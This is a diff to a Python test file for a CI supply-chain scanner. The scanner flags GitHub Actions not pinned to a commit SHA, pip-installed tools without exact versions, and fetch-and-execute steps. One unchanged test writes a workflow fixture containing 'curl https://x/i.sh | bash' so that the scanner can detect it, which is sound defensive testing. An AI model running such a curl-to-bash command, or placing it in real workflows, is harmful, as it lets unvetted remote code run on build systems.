@@ -29,7 +29,7 @@ def action_pin_violations(root: Path) -> list[str]:
     )
 
 
-# --- uses: SHA check (kept for scaffold bodies; placeholder-aware in action_pin_violations) ---
+# --- uses: SHA check (placeholder-aware for graph fragments and legacy scaffold bodies) ---
 
 
 def test_flags_third_party_mutable_tag() -> None:
@@ -110,6 +110,25 @@ def test_action_pin_scan_flags_fetch_execute_in_workflow(tmp_path: Path, monkeyp
     (wf / "ci.yml").write_text("        run: curl https://x/i.sh | bash\n", encoding="utf-8")
     out = action_pin_violations(tmp_path)
     assert any("fetch-and-execute" in v for v in out)
+
+
+def test_action_pin_scan_flags_unpinned_action_and_tool_in_graph_fragment(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    from aviato.plugins import zizmor_scan
+
+    monkeypatch.setattr(zizmor_scan, "zizmor_uses_image_violations", lambda _d, **_k: [])
+    fragments = tmp_path / "aviato" / "library" / "workflow-fragments"
+    fragments.mkdir(parents=True)
+    (fragments / "example.yaml").write_text(
+        "job:\n  steps:\n    - uses: third-party/example@v1\n    - run: python -m pip install build\n",
+        encoding="utf-8",
+    )
+
+    out = action_pin_violations(tmp_path)
+
+    assert any("third-party/example@v1" in violation for violation in out)
+    assert any("pip-installed tool not pinned to an exact version: build" in violation for violation in out)
 
 
 def test_pip_glued_env_marker_still_flags_floating_spec() -> None:
